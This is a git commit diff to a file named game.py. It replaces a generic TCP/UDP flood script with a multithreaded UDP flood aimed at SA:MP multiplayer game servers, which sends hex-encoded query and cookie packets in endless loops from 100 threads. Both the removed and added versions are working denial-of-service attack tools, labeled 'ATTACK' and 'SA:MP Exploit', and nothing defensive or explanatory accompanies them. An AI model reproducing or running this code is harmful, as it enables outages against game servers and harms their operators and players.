736d7752eae06217deb8d2e8ab860844005022e0
gamekakzaza <76263915+gamekakzaza@users.noreply.github.com>
2022-05-02 20:35:03 +0700

    Update game.py

--- game.py
+++ game.py
@@ -1,49 +1,74 @@
-#!/usr/bin/env python3
-
-import random
 import socket
+import struct
+import codecs,sys
 import threading
+import random
+import time
+import os
 
-print("###########################")
-print("###### TCP/UDP FLOOD ######")
-print("###########################")
-ip = str(input(" HOST/IP:"))
-port = int(input(" PORT:"))
-choice = str(input(" UDP(Y/N):"))	
-times = int(input(" PACKETS PER ONE CONNECTION:"))
-threads = int(input(" THREADS:"))
-def run():
-	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +" ATTACK!!!")
-		except:
-			print("[!] ERROR!!!")
-			
-def run2():
-	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" ATTACK!!!")
-		except:
-			s.close()
-			print("[*] ERROR")
 
-for Y in range(threads):
-	if choice == 'Y':
-		th = threading.Thread(target = run)
-		th.start()
-	else:
-		th = threading.Thread(target = run2)
-		th.start()
+
+
+ip = sys.argv[1]
+port = sys.argv[2]
+orgip =ip
+
+Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
+                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
+                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
+                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
+                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
+                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
+                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
+                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
+                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
+                       ]
+
+
+print("Ataque iniciado no ip: %s e Porta: %s"%(orgip,port))
+
+            
+
+
+
+
+
+class MyThread(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 1111):
+                    sock.sendto(Pacotes[9], (ip, int(port)))    
+                
+
+if __name__ == '__main__':
+    try:
+     for x in range(100):                                    
+            mythread = MyThread()  
+            mythread.start()                                  
+            time.sleep(.1)    
+    except(KeyboardInterrupt):
+         os.system('cls' if os.name == 'nt' else 'clear')
+         
+         print('#########################################################################')
+         print('SA:MP Exploit')
+         print('#########################################################################')
+         print('\n\n')
+         print('Ataque para ip {} foi parado'.format(orgip))
+         pass
